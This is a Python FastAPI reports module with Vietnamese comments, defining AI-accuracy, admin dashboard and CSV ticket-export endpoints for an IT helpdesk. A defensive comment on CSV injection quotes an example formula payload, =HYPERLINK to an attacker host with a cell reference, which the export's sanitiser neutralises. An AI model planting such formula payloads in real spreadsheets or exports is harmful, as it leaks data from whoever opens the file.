"""Endpoint báo cáo.

`ai-accuracy` là chỉ số của F3 (US-22) và mở cho cả IT Agent. Bốn endpoint
còn lại là F7 — dashboard vận hành — và **chỉ Admin**: US-37 → US-40 đều
viết "Là Admin". Ma trận ở tài liệu 06 §5 có nhắc "Agent xem số liệu của
chính mình", nhưng chưa story nào định nghĩa "của chính mình" nghĩa là gì với
một báo cáo toàn hệ thống, nên ở đây chọn phương án chặt: chưa định nghĩa
được thì chưa mở. Nới quyền về sau dễ hơn thu hồi quyền đã trót mở.

`/reports/satisfaction` (US-42) vẫn trống — nó thuộc F8, và chưa có đường nào
ghi vào `ticket_ratings` nên chưa có gì để báo cáo.
"""

import csv
import io
from collections.abc import Iterator
from datetime import UTC, datetime

from fastapi import APIRouter, Depends, Query
from fastapi.responses import StreamingResponse
from sqlalchemy.orm import Session

from app.core.dependencies import require_admin, require_agent
from app.db.session import get_db
from app.modules.reports import cache as report_cache
from app.modules.reports.dashboard import DashboardService
from app.modules.reports.schemas import (
    AgentWorkloadResponse,
    AgentWorkloadRowResponse,
    AiAccuracyResponse,
    ConfusionCellResponse,
    CountBucketResponse,
    DurationRowResponse,
    OverviewResponse,
    RateBucket,
    ResolutionTimeResponse,
)
from app.modules.reports.service import AiAccuracyService
from app.modules.users.models import User

router = APIRouter()


@router.get(
    "/ai-accuracy",
    response_model=AiAccuracyResponse,
    summary="Độ chính xác phân loại của AI theo tuần và theo loại sự cố (US-22)",
)
def ai_accuracy(
    from_at: datetime | None = Query(default=None, alias="from"),
    to_at: datetime | None = Query(default=None, alias="to"),
    _: User = Depends(require_agent),
    db: Session = Depends(get_db),
) -> AiAccuracyResponse:
    """Mặc định 30 ngày gần nhất. Chỉ IT Agent và Admin xem được."""
    report = AiAccuracyService(db).report(from_at=from_at, to_at=to_at)

    return AiAccuracyResponse(
        from_at=report.from_at,
        to_at=report.to_at,
        total_runs=report.total_runs,
        applied=report.applied,
        accepted=report.accepted,
        corrected=report.corrected,
        decided=report.decided,
        acceptance_rate=report.acceptance_rate,
        low_confidence_rate=report.low_confidence_rate,
        failure_rate=report.failure_rate,
        avg_latency_ms=report.avg_latency_ms,
        avg_confidence=report.avg_confidence,
        estimated_cost_usd=report.estimated_cost_usd,
        status_breakdown=report.status_breakdown,
        by_category=[_bucket(b) for b in report.by_category],
        by_week=[_bucket(b) for b in report.by_week],
        confusion=[
            ConfusionCellResponse(
                ai_category=c.ai_category, final_category=c.final_category, count=c.count
            )
            for c in report.confusion
        ],
        generated_at=datetime.now(UTC),
        # Chưa cache — ở quy mô này (vài trăm bản ghi) truy vấn dưới 50 ms.
        # Thêm cache khi báo cáo chậm thật, không phải vì "báo cáo thì phải cache".
        cached=False,
    )


def _bucket(bucket) -> RateBucket:
    return RateBucket(
        key=bucket.key,
        label=bucket.label,
        applied=bucket.applied,
        accepted=bucket.accepted,
        corrected=bucket.corrected,
        decided=bucket.decided,
        acceptance_rate=bucket.acceptance_rate,
    )


# ── F7 — Dashboard vận hành (US-37 → US-40) ───────────────────────────


@router.get(
    "/overview",
    response_model=OverviewResponse,
    summary="Tổng quan ticket theo trạng thái và mức ưu tiên (US-37)",
)
def overview(
    from_at: datetime | None = Query(default=None, alias="from"),
    to_at: datetime | None = Query(default=None, alias="to"),
    refresh: bool = Query(default=False, description="Bỏ qua cache, tính lại từ database"),
    _: User = Depends(require_admin),
    db: Session = Depends(get_db),
) -> OverviewResponse:
    """Mặc định 30 ngày gần nhất, kết quả cache 5 phút.

    Cache đặt ở TẦNG NÀY chứ không ở service: service phải luôn trả số thật
    để test và job nền dùng lại được: chỉ đường HTTP mới cần cache.
    """
    start, end = DashboardService.resolve_window(from_at, to_at)
    cache_key = report_cache.window_key("overview", start, end)

    if not refresh and (hit := report_cache.get(cache_key)) is not None:
        return OverviewResponse.model_validate({**hit, "cached": True})

    report = DashboardService(db).overview(start, end)
    payload = OverviewResponse(
        from_at=report.from_at,
        to_at=report.to_at,
        total=report.total,
        open_total=report.open_total,
        resolved_total=report.resolved_total,
        breached_total=report.breached_total,
        unassigned_total=report.unassigned_total,
        breach_rate=report.breach_rate,
        by_status=[_count(b) for b in report.by_status],
        by_priority=[_count(b) for b in report.by_priority],
        by_category=[_count(b) for b in report.by_category],
        daily=[_count(b) for b in report.daily],
        generated_at=datetime.now(UTC),
        cached=False,
    )
    report_cache.set(cache_key, payload.model_dump(mode="json"))
    return payload


@router.get(
    "/resolution-time",
    response_model=ResolutionTimeResponse,
    summary="Thời gian phản hồi và xử lý theo loại sự cố — p50 và p90 (US-38)",
)
def resolution_time(
    from_at: datetime | None = Query(default=None, alias="from"),
    to_at: datetime | None = Query(default=None, alias="to"),
    _: User = Depends(require_admin),
    db: Session = Depends(get_db),
) -> ResolutionTimeResponse:
    start, end = DashboardService.resolve_window(from_at, to_at)
    rows = DashboardService(db).resolution_time(start, end)
    return ResolutionTimeResponse(
        from_at=start,
        to_at=end,
        rows=[
            DurationRowResponse(
                key=r.key,
                label=r.label,
                tickets=r.tickets,
                first_response_p50_minutes=r.first_response_p50,
                first_response_p90_minutes=r.first_response_p90,
                resolution_p50_minutes=r.resolution_p50,
                resolution_p90_minutes=r.resolution_p90,
            )
            for r in rows
        ],
        generated_at=datetime.now(UTC),
    )


@router.get(
    "/agent-workload",
    response_model=AgentWorkloadResponse,
    summary="Khối lượng công việc theo từng IT Agent (US-39)",
)
def agent_workload(
    from_at: datetime | None = Query(default=None, alias="from"),
    to_at: datetime | None = Query(default=None, alias="to"),
    _: User = Depends(require_admin),
    db: Session = Depends(get_db),
) -> AgentWorkloadResponse:
    """Sắp xếp do frontend làm: bảng chỉ vài chục dòng, gửi thêm tham số
    `sortBy` xuống backend chỉ để sắp lại một mảng nhỏ là công vô ích."""
    start, end = DashboardService.resolve_window(from_at, to_at)
    rows = DashboardService(db).agent_workload(start, end)
    return AgentWorkloadResponse(
        from_at=start,
        to_at=end,
        rows=[
            AgentWorkloadRowResponse(
                agent_id=r.agent_id,
                agent_name=r.agent_name,
                open_tickets=r.open_tickets,
                urgent_open=r.urgent_open,
                resolved_in_period=r.resolved_in_period,
                avg_resolution_minutes=r.avg_resolution_minutes,
                sla_breached=r.sla_breached,
                sla_breach_rate=r.sla_breach_rate,
                avg_rating=r.avg_rating,
                rating_count=r.rating_count,
            )
            for r in rows
        ],
        generated_at=datetime.now(UTC),
    )


@router.get("/tickets/export", summary="Xuất danh sách ticket ra CSV (US-40)")
def export_tickets(
    from_at: datetime | None = Query(default=None, alias="from"),
    to_at: datetime | None = Query(default=None, alias="to"),
    _: User = Depends(require_admin),
    db: Session = Depends(get_db),
) -> StreamingResponse:
    """Xuất theo kiểu stream, trần 10.000 dòng.

    Trần là bắt buộc chứ không phải phòng xa: không có nó, một khoảng thời
    gian rộng sẽ giữ transaction mở rất lâu và chiếm một kết nối trong pool
    suốt thời gian tải file.
    """
    start, end = DashboardService.resolve_window(from_at, to_at)
    filename = f"tickets-{start:%Y%m%d}-{end:%Y%m%d}.csv"

    return StreamingResponse(
        _csv_lines(DashboardService(db).export_rows(start, end)),
        media_type="text/csv; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


def _count(bucket) -> CountBucketResponse:
    return CountBucketResponse(key=bucket.key, label=bucket.label, count=bucket.count)


# ★ CHỐNG CSV INJECTION (US-40).
#
# Excel và LibreOffice coi ô bắt đầu bằng một trong các ký tự này là CÔNG
# THỨC. Một ticket có tiêu đề `=HYPERLINK("http://kẻ-tấn-công/?"&A1,"Bấm")`
# sẽ chạy khi Admin mở file — và Admin chính là người duy nhất tải được file
# này. Tiền tố dấu nháy đơn buộc phần mềm bảng tính đọc ô đó là văn bản.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _sanitize(value) -> str:
    if value is None:
        return ""
    text = value.isoformat() if isinstance(value, datetime) else str(value)
    return "'" + text if text.startswith(FORMULA_PREFIXES) else text


def _csv_lines(rows) -> Iterator[str]:
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\n")

    def flush() -> str:
        buffer.seek(0)
        line = buffer.read()
        buffer.seek(0)
        buffer.truncate(0)
        return line

    # BOM để Excel trên Windows nhận ra UTF-8; thiếu nó thì tiếng Việt có dấu
    # hiện thành ký tự lạ và người dùng sẽ báo là "báo cáo bị lỗi font".
    yield "﻿"

    writer.writerow(
        [
            "Mã ticket",
            "Tiêu đề",
            "Trạng thái",
            "Mức ưu tiên",
            "Loại sự cố",
            "Người xử lý",
            "Ngày tạo",
            "Ngày xử lý xong",
            "Hạn xử lý",
        ]
    )
    yield flush()

    for row in rows:
        writer.writerow([_sanitize(cell) for cell in row])
        yield flush()
